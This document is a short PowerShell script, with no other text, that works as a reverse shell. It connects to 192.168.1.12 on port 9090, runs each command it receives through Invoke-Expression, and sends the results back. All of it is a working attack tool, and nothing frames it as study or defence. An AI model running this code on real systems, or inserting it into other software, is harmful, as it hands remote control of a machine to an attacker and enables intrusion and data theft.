$c=New-Object Net.Sockets.TCPClient('192.168.1.12',9090);
$s=$c.GetStream();[byte[]]$b=0..65535|%{0};
while(($i=$s.Read($b,0,$b.Length)) -ne 0){
  $d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);
  $r=(iex $d 2>&1|Out-String);
  $x=([text.encoding]::ASCII).GetBytes($r);
  $s.Write($x,0,$x.Length);$s.Flush()
};
$c.Close()
